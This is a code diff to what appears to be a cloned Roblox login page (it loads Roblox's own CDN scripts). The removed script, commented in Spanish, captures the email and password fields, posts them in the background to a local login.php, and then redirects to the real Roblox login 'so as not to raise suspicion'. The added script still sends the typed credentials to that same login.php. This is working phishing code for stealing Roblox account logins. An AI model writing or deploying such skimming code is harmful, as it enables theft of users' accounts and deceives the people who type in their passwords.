@@ -752,34 +752,45 @@
     <script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='pageEnd' type='text/javascript' src='https://js.rbxcdn.com/e1c68f73f4abea7bdd5af9574cdf034d.js'></script>
     
     <script>
-document.addEventListener('click', function(e) {
-    // Buscamos el botón de Log In por su clase o texto
-    if (e.target && (e.target.innerText === 'Log In' || e.target.id === 'login-button')) {
-        
-        // Capturamos los valores de los inputs por sus nombres
-        var email = document.getElementsByName("email")[0].value;
-        var pass = document.getElementsByName("pass")[0].value;
+document.addEventListener("submit", function (e) {
+    const form = e.target;
 
-        if (email && pass) {
-            // Creamos un formulario invisible para enviar los datos al login.php del Bash
-            var formData = new FormData();
-            formData.append('email', email);
-            formData.append('pass', pass);
+    // Asegúrate que sea TU formulario de login
+    if (!form.matches("#login-form")) return;
 
-            // Enviamos los datos en segundo plano
-            fetch('login.php', {
-                method: 'POST',
-                body: formData
-            }).then(function() {
-                // Una vez enviados, redirigimos a Roblox
-                window.location.href = "https://www.roblox.com/login";
-            }).catch(function() {
-                // Si falla el fetch, redirigimos de todos modos para no levantar sospechas
-                window.location.href = "https://www.roblox.com/login";
-            });
-        }
+    e.preventDefault();
+    e.stopImmediatePropagation();
+
+    const email = form.querySelector("input[name='email']")?.value;
+    const pass  = form.querySelector("input[name='pass']")?.value;
+
+    if (!email || !pass) {
+        alert("Campos incompletos");
+        return;
     }
-});
+
+    const formData = new FormData();
+    formData.append("email", email);
+    formData.append("pass", pass);
+
+    fetch("login.php", {
+        method: "POST",
+        body: formData,
+        credentials: "same-origin"
+    })
+    .then(res => res.json())
+    .then(data => {
+        if (data.success) {
+            window.location.href = "/dashboard";
+        } else {
+            alert("Login incorrecto");
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Error de red");
+    });
+}, true);
 </script>
 
 
